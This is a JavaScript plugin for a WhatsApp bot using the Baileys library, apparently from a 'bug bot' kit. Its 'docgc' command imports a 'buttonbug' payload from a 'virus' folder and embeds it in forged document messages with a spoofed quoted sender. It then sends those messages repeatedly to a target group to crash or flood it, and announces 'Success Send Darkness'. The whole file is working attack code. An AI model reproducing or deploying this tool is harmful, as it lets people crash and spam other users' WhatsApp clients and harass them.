import fetch from 'node-fetch'
import { buttonbug } from '../virus/buttonbug.js'
import pkg from '@adiwajshing/baileys'

const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = pkg

const nmiku = [
'https://telegra.ph/file/9dc229b17638708432b7c.jpg',
'https://telegra.ph/file/c10758adc076889d813c9.jpg'
].getRandom()

let handler = async (m, { conn, args, usedPrefix, command, participants }) => {

const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `𝔸𝕣𝕚𝕗𝕫𝕪𝕟𝕏𝔻 𝔻𝔼𝕍\n${buttonbug}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

if (args.length == 0) return m.reply(`*Syntax Error!*\n\nUse : ${usedPrefix+command} id group target|amount spam|timer\nExample : ${command} 123xxx@g.us|1|10s\n\n\ns = Second/Detik`)
const num = args[0].split('|')[0]
const jumlah = args[0].split('|')[1]
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 © 𝑨𝒓𝒊𝒇𝒛𝒚𝒏 𝐌𝐎𝐃𝐒 ☠️\n\n.${buttonbug}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat, quoted: doc })
conn.relayMessage(num, document.message, { messageId: document.key.id })
}
m.reply(`Success Send Darkness To: ${num}\nAmount Spam: ${jumlah}`)
}
handler.help = ['docgc']
handler.tags = ['bugmenu']
handler.command = ['docgc']

handler.owner = true 

export default handler